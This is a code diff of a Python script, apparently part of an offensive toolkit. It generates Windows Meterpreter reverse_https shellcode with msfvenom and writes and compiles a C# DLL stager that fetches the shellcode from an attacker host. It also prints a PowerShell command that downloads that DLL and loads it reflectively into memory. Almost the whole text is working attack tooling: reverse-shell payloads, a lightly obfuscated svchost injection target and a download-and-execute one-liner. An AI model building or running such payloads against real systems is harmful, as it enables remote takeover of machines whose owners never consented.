@@ -3,20 +3,21 @@ import ak
 import os
 import subprocess
 
-LHOST = "192.168.49.65"
-LPORT = 443
 BASE_FILENAME = 'win_ps_dll_runner'
+FN_CS = BASE_FILENAME + '.cs'
+FN_SHELLCODE = BASE_FILENAME + ".sc"
+
 #ENCODER="x64/xor_dynamic"
 #ENCODER="x64/zutto_dekiru"
 ENCODER="generic/none"
-MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
-MSFVENOM32_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e {ENCODER}"
+MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e {ENCODER}"
+MSFVENOM32_CMD = f"msfvenom --platform Windows -p windows/meterpreter/reverse_https LHOST={ak.LHOST} LPORT={ak.LPORT} -f raw -e {ENCODER}"
 SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
 XOR_KEY = b'\x00'
 WEBROOT = "/var/www/html"
 SHELLCODE_PATH = "/sc"
 SHELLCODE32_PATH = "/sc32"
-STAGER_URL = f"http://{LHOST}/sc"
+STAGER_URL = f"http://{ak.LHOST}/sc"
 
 def generate():
   svchost_path = ak.Obfuscator(SVCHOST_PATH)
@@ -52,46 +53,29 @@ namespace LeMans
 """.format(ak=ak,
            URL_DL_CODE=url_dl_code)
 
-  print(template)
-  f = open(BASE_FILENAME + '.cs', "w")
-  f.write(template)
-  f.close()
-
-def compile():
-  cmd = f"mcs /target:library {BASE_FILENAME}.cs"
-  os.system(cmd)
+  ak.write_file(FN_CS, template)
 
 def generate_shellcode():
   shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)
   shellcode32 = ak.ShellCode(MSFVENOM32_CMD, xor_key=XOR_KEY)
 
-  # Write 64bit shellcode
-  f = open(BASE_FILENAME + '.sc', "wb")
-  f.write(shellcode.get_bytes())
-  f.close()
-  print("Wrote " + BASE_FILENAME + '.sc')
-
-  # Write 32bit shellcode
-  f = open(BASE_FILENAME + '.sc32', "wb")
-  f.write(shellcode32.get_bytes())
-  f.close()
-  print("Wrote " + BASE_FILENAME + '.sc32')
+  ak.write_file(FN_SHELLCODE, shellcode.get_bytes())
+  ak.write_file(FN_SHELLCODE + "32", shellcode32.get_bytes())
 
 def main():
   generate()
-  compile()
-
+  ak.cs_compile(FN_CS, '/target:library')
   generate_shellcode()
 
   print("Load with:")
   ps = """
-$data = (New-Object System.Net.WebClient).DownloadData('http://{LHOST}/{fn}')
+$data = (New-Object System.Net.WebClient).DownloadData('http://{lhost}/{fn}')
 $assem = [System.Reflection.Assembly]::Load($data)
 
 $class = $assem.GetType('LeMans.Class1')
 $method = $class.GetMethod("ferrari")
 $method.Invoke(0, $null)
-""".format(fn=BASE_FILENAME + '.dll', LHOST=LHOST)
+""".format(fn=BASE_FILENAME + '.dll', lhost=ak.LHOST)
   print(ps)
 
   print("Run the following:")
